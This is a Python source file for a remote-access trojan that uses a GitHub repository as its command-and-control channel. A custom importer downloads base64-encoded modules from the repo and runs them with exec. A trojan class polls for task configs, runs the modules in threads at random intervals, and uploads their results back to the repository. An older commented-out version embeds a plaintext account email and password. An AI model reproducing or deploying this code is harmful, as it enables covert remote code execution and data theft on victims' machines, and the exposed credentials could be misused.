import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'codebycody'
    sess = github3.login(token=token)
    return sess.repository('codebycody', 'HIVE')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        binddata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(binddata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1,10))

            time.sleep(random.randint(30*60, 3*60*60))

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()

# trojan_id = "abc"

# trojan_config = "%s.json" % trojan_id
# data_path = "data/%s/" % trojan_id
# trojan_modules = []
# configured = False
# task_queue = queue.Queue()

# def connect_to_github():
#     gh = login(username="w2003111@mvrht.net",password="Gith0933")
#     repo = gh.repository("codebycody", "HIVE")
#     branch = repo.branch("main")
#     return gh,repo,branch

# def get_file_contents(filepath):
#     gh,repo,branch = connect_to_github()
#     tree = branch.commit.commit.tree.to_tree().recurse()

#     for filename in tree.tree:
#         if filepath in filename.path:
#             print("[*] Found file %s" % filepath)
#             blob = repo.blob(filename._json_data['sha'])
#             return blob.content

#     return None

# def get_trojan_config():
#     global configured
#     config_json = get_file_contents(trojan_config)
#     config = json.loads(base64.b64decode(config_json))
#     configured = True

#     for task in config:
#         if task['module'] not in sys.modules:
#             exec("import %s" % task['module'])

#     return config

# def store_module_result():
#     gh,repo,branch = connect_to_github()
#     remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
#     repo.creat_file(remote_path, "Commit message", base64.b64encode(data))

#     return

# class GitImporter(object):
#     def __init__(self):
#        self.current_module_code = ""

#     def find_module(self,fullname,path=None):
#         if configured:
#             print("[*] Attempting to retrieve %s" % fullname)
#             new_library = get_file_contents("modules/%s" % fullname)

#             if new_library is not None:
#                 self.current_module_code = base64.b64decode(new_library)
#                 return self

#         return None

#     def load_module(self,name):
#         module = importlib.new_module(name)
#         exec(str(self.current_module_code in module.__dict__))
#         sys.modules[name] = module
#         return module

# def module_runner(module):
#     task_queue.put(1)
#     print(sys.modules[module])
#     result = sys.modules[module].run()
#     task_queue.get()
#     strore_module_result(result)
#     return

# sys.meta_path = [GitImporter()]

# while True:
#     if task_queue.empty():
#         config = get_trojan_config()

#         for task in config:
#             t = threading.Thread(target=module_runner,args=(task['module'],))
#             t.start()
#             time.sleep(random.randint(1,10))

#     time.sleep(random.randint(1000,10000))
